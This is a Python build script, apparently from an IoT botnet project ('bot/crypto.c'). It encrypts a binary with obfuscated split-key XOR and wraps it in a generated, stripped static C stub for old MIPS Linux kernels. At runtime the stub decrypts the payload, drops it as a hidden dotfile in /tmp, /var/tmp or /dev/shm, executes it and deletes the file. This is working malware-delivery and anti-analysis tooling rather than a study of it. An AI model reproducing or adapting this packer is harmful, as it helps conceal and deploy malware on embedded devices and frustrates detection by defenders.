#!/usr/bin/env python3
"""
mipspk.py — Self-extracting stub packer for architectures where XpLt is
            incompatible (MIPS 2.6.x kernels: stub syscalls unavailable).

Uses the SAME key material as crypto.c (_rx0 XOR _rx1 = AES key),
so the packed stub requires the magic key to decrypt — consistent with
the rest of the build.

Usage (called by build.sh):
    python3 mipspk.py <input_bin> <output_bin> <crypto_c_path> \\
                      <cross_cc> [extra_cc_flags...]

Encryption:
    key[32]        = _rx0[i] XOR _rx1[i]   (same derivation as crypto.c)
    keystream[i]   = key[i%32] XOR (i&0xFF) XOR ((i>>8)&0xFF)
    ciphertext[i]  = plaintext[i] XOR keystream[i]

    The counter mixing (i & 0xFF, i >> 8) prevents the repeating-key
    pattern visible in plain XOR.  Decryption is identical.

Stub embeds _rx0 and _rx1 with the same XOR-obfuscated values as
crypto.c — patched by setup.py before the build.  An unpatched binary
(wrong key) produces garbage and the execve fails silently.

Stub behaviour at runtime:
    1. Derive key from _rx0 XOR _rx1.
    2. Decrypt payload in .data (writable in static ELF).
    3. Write to first writable tmpdir (/tmp, /var/tmp, /dev/shm).
    4. fork(): child execve()s the real binary; parent waits 200ms,
       unlinks the temp file, then exits.
    Only uses syscalls present since Linux 2.4.x.
"""

import sys
import os
import re
import subprocess
import tempfile
import stat


# ---------------------------------------------------------------------------
# Key extraction — mirrors setup.py's read_current_key_cpp()
# ---------------------------------------------------------------------------

def _read_xor_array(src: str, name: str) -> bytes:
    pat = rf'static uint8_t {name}\[32\]\s*=\s*\{{\s*(.*?)\s*\}};'
    m = re.search(pat, src, re.DOTALL)
    if not m:
        return b''
    raw = re.findall(r'0[xX]([0-9a-fA-F]{1,2})', m.group(1))
    return bytes(int(h, 16) for h in raw[:32])


def read_key_from_crypto_c(crypto_c_path: str):
    """Return (rx0, rx1, real_key) from bot/crypto.c."""
    with open(crypto_c_path, 'r') as f:
        src = f.read()
    rx0 = _read_xor_array(src, '_rx0')
    rx1 = _read_xor_array(src, '_rx1')
    if len(rx0) != 32 or len(rx1) != 32:
        raise ValueError(f"Could not parse _rx0/_rx1 from {crypto_c_path}")
    key = bytes(a ^ b for a, b in zip(rx0, rx1))
    return rx0, rx1, key


# ---------------------------------------------------------------------------
# Encryption  (keystream = key[i%32] ^ (i&0xFF) ^ ((i>>8)&0xFF))
# ---------------------------------------------------------------------------

def encrypt(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    for i, b in enumerate(data):
        ks = key[i % 32] ^ (i & 0xFF) ^ ((i >> 8) & 0xFF)
        out[i] = b ^ ks
    return bytes(out)


# ---------------------------------------------------------------------------
# C stub generation
# ---------------------------------------------------------------------------

def _to_c_array(name: str, data: bytes, const: bool = False) -> str:
    prefix = 'static const ' if const else 'static '
    chunks = [f'0x{b:02x}' for b in data]
    lines = ['    ' + ', '.join(chunks[i:i+16]) for i in range(0, len(chunks), 16)]
    return f'{prefix}unsigned char {name}[] = {{\n' + ',\n'.join(lines) + '\n};\n'


def generate_stub(encrypted: bytes, rx0: bytes, rx1: bytes) -> str:
    payload_arr = _to_c_array('_pd', encrypted)
    rx0_arr     = _to_c_array('_rx0', rx0)
    rx1_arr     = _to_c_array('_rx1', rx1, const=True)
    plen        = len(encrypted)

    return f"""\
/* Auto-generated self-extracting stub — do not edit.
   Requires correct _rx0/_rx1 (magic key) to decrypt. */
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>

/* Key halves — same XOR-obfuscation as crypto.c, patched by setup.py */
{rx0_arr}
{rx1_arr}

/* Encrypted payload */
{payload_arr}
static const int _pl = {plen};

/* Derive key and decrypt in-place.
   keystream[i] = (rx0[i%32]^rx1[i%32]) ^ (i&0xFF) ^ ((i>>8)&0xFF) */
static void _dec(void) {{
    unsigned char k[32];
    int i;
    for (i = 0; i < 32; i++) k[i] = _rx0[i] ^ _rx1[i];
    for (i = 0; i < _pl; i++)
        _pd[i] ^= k[i % 32] ^ (unsigned char)(i) ^ (unsigned char)(i >> 8);
}}

static int _write_all(int fd, const unsigned char *b, int n) {{
    int w, d = 0;
    while (d < n) {{
        w = (int)write(fd, b + d, (unsigned)(n - d));
        if (w <= 0) return -1;
        d += w;
    }}
    return 0;
}}

/* Minimal string helpers — no libc dep */
static int _slen(const char *s) {{ int n=0; while(s[n]) n++; return n; }}
static void _scat(char *d, const char *s) {{
    int dl = _slen(d);
    int i = 0;
    while ((d[dl+i] = s[i])) i++;
}}

int main(int argc, char **argv, char **envp) {{
    static const char *dirs[] = {{"/tmp","/var/tmp","/dev/shm",(void*)0}};
    char p[64];
    int fd = -1, i;
    pid_t pid;
    /* itoa(getpid()) */
    unsigned int n = (unsigned int)getpid();
    char nb[12]; int np = 11;
    nb[11] = '\\0';
    if (n == 0) nb[--np] = '0';
    else while (n) {{ nb[--np] = '0' + (n % 10); n /= 10; }}

    _dec();

    for (i = 0; dirs[i] && fd < 0; i++) {{
        p[0] = '\\0';
        _scat(p, dirs[i]);
        _scat(p, "/.");
        _scat(p, nb + np);
        fd = open(p, O_WRONLY|O_CREAT|O_TRUNC, 0700);
    }}
    if (fd < 0) return 1;
    if (_write_all(fd, _pd, _pl) != 0) {{ close(fd); unlink(p); return 1; }}
    close(fd);

    pid = fork();
    if (pid < 0)  {{ unlink(p); return 1; }}
    if (pid == 0) {{ execve(p, argv, envp); _exit(1); }}

    /* Parent: give child time to execve, then clean up */
    usleep(200000);
    unlink(p);
    {{int st; waitpid(pid, &st, 0);}}
    return 0;
}}
"""


# ---------------------------------------------------------------------------
# Cross-compile the stub
# ---------------------------------------------------------------------------

XCFLAGS = ('-Os -s -Wno-all -ffunction-sections -fdata-sections '
           '-fno-ident -fomit-frame-pointer')


def compile_stub(stub_src: str, cc: str, extra_flags: list, output: str) -> bool:
    with tempfile.NamedTemporaryFile(suffix='.c', mode='w', delete=False) as f:
        f.write(stub_src)
        src = f.name
    try:
        cmd = (cc.split() + XCFLAGS.split() + extra_flags +
               ['-static', '-o', output, src,
                '-Wl,--gc-sections', '-Wl,--strip-all'])
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            print(f'  stub compile FAIL:\n{r.stderr.strip()[:400]}', file=sys.stderr)
            return False
        return True
    finally:
        os.unlink(src)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    if len(sys.argv) < 5:
        print(
            f'Usage: {sys.argv[0]} <input_bin> <output_bin> '
            '<crypto_c_path> <cross_cc> [extra_cc_flags...]',
            file=sys.stderr)
        sys.exit(1)

    inp, out, crypto_c, cc = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    extra_flags = sys.argv[5:]

    try:
        rx0, rx1, key = read_key_from_crypto_c(crypto_c)
    except Exception as e:
        print(f'  ERROR reading key from {crypto_c}: {e}', file=sys.stderr)
        sys.exit(1)

    with open(inp, 'rb') as f:
        data = f.read()

    encrypted = encrypt(data, key)
    stub_src   = generate_stub(encrypted, rx0, rx1)

    if not compile_stub(stub_src, cc, extra_flags, out):
        sys.exit(1)

    os.chmod(out, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP |
             stat.S_IROTH | stat.S_IXOTH)

    in_sz  = len(data)
    out_sz = os.path.getsize(out)
    print(f'  {os.path.basename(inp)}: {in_sz//1024}KB '
          f'→ stub {out_sz//1024}KB  [key: {key.hex()[:16]}...]')


if __name__ == '__main__':
    main()
